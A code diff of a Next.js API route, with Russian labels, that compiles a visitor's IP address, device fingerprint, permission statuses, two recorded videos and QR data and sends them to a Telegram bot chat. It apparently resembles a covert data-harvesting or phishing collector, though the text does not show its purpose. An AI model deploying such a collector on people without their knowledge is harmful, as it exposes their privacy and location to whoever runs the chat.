@@ -25,7 +25,7 @@ export async function POST(req: NextRequest) {
       permissionStatus,
     } = await req.json();
 
-    const ipAddress = req.headers.get("x-forwarded-for") || "Unavailable"; // Получаем IP-адрес из заголовка
+    const ipAddress = req.headers.get("x-forwarded-for") || "Unavailable";
 
     const messages: Promise<Response>[] = [];
 
@@ -34,26 +34,57 @@ export async function POST(req: NextRequest) {
 
     summaryText += "--- 📱 *Информация об устройстве* ---\n";
     summaryText += `*IP:* \`${ipAddress}\`\n`;
-    summaryText += `*User Agent:* \`${clientInfo?.userAgent || "Недоступно"}\`\n`;
-    summaryText += `*Платформа:* ${clientInfo?.platform || "Недоступно"}\n`;
-    summaryText += `*Ядра CPU:* ${clientInfo?.hardwareConcurrency || "Недоступно"}\n`;
-    summaryText += `*Память устройства:* ${deviceMemory ? `${deviceMemory} GB` : "Недоступно"}\n`;
-    summaryText += `*Батарея:* ${batteryInfo?.level !== undefined ? `${(batteryInfo.level * 100).toFixed(0)}%` : "Недоступно"} (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;
+    // User Agent удален по запросу
+    if (clientInfo?.platform && clientInfo.platform !== "Недоступно") {
+      summaryText += `*Платформа:* ${clientInfo.platform}\n`;
+    }
+    if (clientInfo?.hardwareConcurrency && clientInfo.hardwareConcurrency !== "Недоступно") {
+      summaryText += `*Ядра CPU:* ${clientInfo.hardwareConcurrency}\n`;
+    }
+    if (deviceMemory && deviceMemory !== "Недоступно") {
+      summaryText += `*Память устройства:* ${deviceMemory} GB\n`;
+    }
+    if (batteryInfo?.level !== undefined && batteryInfo.status !== "Not Supported") {
+      summaryText += `*Батарея:* ${(batteryInfo.level * 100).toFixed(0)}% (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;
+    } else if (batteryInfo?.status && batteryInfo.status !== "Available") {
+      summaryText += `*Батарея:* ${batteryInfo.status}\n`;
+    }
+
 
     summaryText += "\n--- 🌐 *Информация о сети* ---\n";
-    summaryText += `*Тип соединения:* ${networkInfo?.effectiveType || "Недоступно"}\n`;
-    summaryText += `*RTT:* ${networkInfo?.rtt !== undefined ? `${networkInfo.rtt} ms` : "Недоступно"}\n`;
-    summaryText += `*Downlink:* ${networkInfo?.downlink !== undefined ? `${networkInfo.downlink} Mbps` : "Недоступно"}\n`;
+    if (networkInfo?.effectiveType && networkInfo.effectiveType !== "Недоступно") {
+      summaryText += `*Тип соединения:* ${networkInfo.effectiveType}\n`;
+    }
+    if (networkInfo?.rtt !== undefined && networkInfo.rtt !== "Недоступно") {
+      summaryText += `*RTT:* ${networkInfo.rtt} ms\n`;
+    }
+    if (networkInfo?.downlink !== undefined && networkInfo.downlink !== "Недоступно") {
+      summaryText += `*Downlink:* ${networkInfo.downlink} Mbps\n`;
+    }
 
     summaryText += "\n--- ✅ *Статус разрешений* ---\n";
-    summaryText += `*Геолокация:* ${permissionStatus?.geolocation || "Неизвестно"}\n`;
-    summaryText += `*Камера:* ${permissionStatus?.camera || "Неизвестно"}\n`;
-    summaryText += `*Микрофон:* ${permissionStatus?.microphone || "Неизвестно"}\n`;
+    if (permissionStatus?.geolocation && permissionStatus.geolocation !== "Unknown") {
+      summaryText += `*Геолокация:* ${permissionStatus.geolocation}\n`;
+    }
+    if (permissionStatus?.camera && permissionStatus.camera !== "Unknown") {
+      summaryText += `*Камера:* ${permissionStatus.camera}\n`;
+    }
+    if (permissionStatus?.microphone && permissionStatus.microphone !== "Unknown") {
+      summaryText += `*Микрофон:* ${permissionStatus.microphone}\n`;
+    }
 
     summaryText += "\n--- 🎥 *Медиа и QR* ---\n";
-    summaryText += `*Видео 1 записано:* ${video1 ? "Да ✅" : "Нет ❌"}\n`;
-    summaryText += `*Видео 2 записано:* ${video2 ? "Да ✅" : "Нет ❌"}\n`;
-    summaryText += `*QR-код отсканирован:* ${qrCodeData ? `Да ✅ (\`${qrCodeData}\`)` : "Нет ❌"}\n`;
+    if (video1) {
+      summaryText += `*Видео 1 записано:* Да ✅\n`;
+    }
+    if (video2) {
+      summaryText += `*Видео 2 записано:* Да ✅\n`;
+    }
+    if (qrCodeData) {
+      summaryText += `*QR-код отсканирован:* Да ✅ (\`${qrCodeData}\`)\n`;
+    } else {
+      summaryText += `*QR-код отсканирован:* Нет ❌\n`;
+    }
     
     messages.push(
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -64,7 +95,7 @@ export async function POST(req: NextRequest) {
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
           text: summaryText,
-          parse_mode: "Markdown", // Используем Markdown для форматирования
+          parse_mode: "Markdown",
         }),
       }).then(async res => {
         console.log("Summary message API response status:", res.status);
